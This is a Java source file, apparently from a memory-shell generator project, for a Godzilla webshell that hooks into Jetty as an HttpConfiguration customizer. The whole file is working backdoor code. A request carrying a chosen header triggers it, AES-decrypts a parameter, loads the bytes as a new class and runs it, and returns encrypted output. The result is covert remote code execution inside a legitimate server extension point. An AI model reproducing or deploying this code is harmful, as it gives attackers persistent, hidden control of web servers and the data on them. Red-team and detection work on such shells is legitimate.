package com.reajason.javaweb.memshell.shelltool.godzilla;

import org.eclipse.jetty.server.Connector;
import org.eclipse.jetty.server.HttpConfiguration;
import org.eclipse.jetty.server.Request;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.lang.reflect.Method;

/**
 * @author ReaJason
 * @since 2025/11/29
 */
public class GodzillaJettyCustomizer extends ClassLoader implements HttpConfiguration.Customizer {
    private static String key;
    private static String pass;
    private static String md5;
    private static String headerName;
    private static String headerValue;
    private static Class<?> payload;

    public GodzillaJettyCustomizer() {
    }

    protected GodzillaJettyCustomizer(ClassLoader parent) {
        super(parent);
    }

    // jetty9+
    public void customize(Connector connector, HttpConfiguration channelConfig, Request request) {
        try {
            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
            if (value != null && value.contains(headerValue)) {
                Object response = invokeMethod(request, "getResponse");
                PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
                try {
                    String parameter = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, pass);
                    byte[] data = base64Decode(parameter);
                    data = this.x(data, false);
                    if (payload == null) {
                        payload = new GodzillaJettyCustomizer(Thread.currentThread().getContextClassLoader()).defineClass(data, 0, data.length);
                    } else {
                        ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                        Object f = payload.newInstance();
                        f.equals(arrOut);
                        f.equals(request);
                        f.equals(data);
                        f.toString();
                        writer.write(md5.substring(0, 16));
                        writer.write(base64Encode(this.x(arrOut.toByteArray(), true)));
                        writer.write(md5.substring(16));
                        writer.flush();
                        writer.close();
                    }
                } catch (Throwable e) {
                    e.printStackTrace();
                    writer.write(getErrorMessage(e));
                }
                invokeMethod(request, "setHandled", new Class[]{boolean.class}, new Object[]{true});
                return;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName) {
        return invokeMethod(obj, methodName, null, null);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }
            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + (obj instanceof Class ? ((Class<?>) obj).getName() : obj.getClass().getName()) + "." + methodName, e);
        }
    }

    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        try {
            Object encoder = Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            Object encoder = Class.forName("sun.misc.BASE64Encoder").newInstance();
            return (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }

    public byte[] x(byte[] s, boolean m) throws Exception {
        Cipher c = Cipher.getInstance("AES");
        c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
        return c.doFinal(s);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
